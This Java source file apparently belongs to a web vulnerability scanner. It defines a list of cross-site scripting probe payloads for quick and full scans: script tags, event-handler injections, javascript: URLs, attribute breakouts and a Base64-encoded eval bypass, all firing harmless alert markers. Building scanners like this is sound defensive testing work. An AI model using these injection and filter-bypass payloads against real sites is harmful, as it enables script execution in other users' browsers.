package com.network.monitor.util.payload;

import java.util.ArrayList;
import java.util.List;

public final class XssPayload {

    private XssPayload() {
    }

    public static List<PayloadCase> getPayloads(String scanType) {
        List<PayloadCase> payloads = new ArrayList<>();
        
        payloads.add(new PayloadCase("<svg/onload=alert('scan_xss_quick')>", "scan_xss_quick", "SVG 事件回显探测"));
        
        if ("FULL".equalsIgnoreCase(scanType)) {
            payloads.add(new PayloadCase("<img src=x onerror=alert('scan_xss_full')>", "scan_xss_full", "IMG onerror 回显探测"));
            payloads.add(new PayloadCase("<script>alert('scan_xss_script')</script>", "scan_xss_script", "Script 标签探测"));
            payloads.add(new PayloadCase("'\"><script>alert('scan_xss_attr')</script>", "scan_xss_attr", "属性注入探测"));
            payloads.add(new PayloadCase("<body onload=alert('scan_xss_body')>", "scan_xss_body", "Body 事件探测"));
            payloads.add(new PayloadCase("<iframe src='javascript:alert(\"scan_xss_iframe\")'>", "scan_xss_iframe", "Iframe 注入探测"));
            payloads.add(new PayloadCase("<div onmouseover=\"alert('scan_xss_hover')\">", "scan_xss_hover", "鼠标事件探测"));
            payloads.add(new PayloadCase("javascript:alert('scan_xss_proto')", "scan_xss_proto", "协议注入探测"));
            payloads.add(new PayloadCase("<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ3NjYW5feHNzX2Jhc2U2NCcp'))\">", "scan_xss_base64", "Base64编码绕过探测"));
        }
        
        return payloads;
    }
}
